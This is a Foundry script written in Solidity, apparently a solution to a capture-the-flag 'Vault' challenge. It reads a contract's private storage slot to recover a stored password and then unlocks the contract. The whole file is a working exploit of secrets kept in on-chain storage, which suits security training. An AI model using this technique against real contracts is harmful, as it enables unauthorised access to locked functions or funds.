// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/9_IVault.sol";

address constant INSTANCE = 0xc34FdAB67BdE6133A7D94123e006E99e2cf9e9c2;

contract VaultPOCScript is Script {
    IVault instance = IVault(INSTANCE);

    function run() external {
        vm.startBroadcast();

        assert(instance.locked());
        bytes32 password = vm.load(INSTANCE, 0x0000000000000000000000000000000000000000000000000000000000000001);

        instance.unlock(password);
        assert(!instance.locked());

        vm.stopBroadcast();
    }
}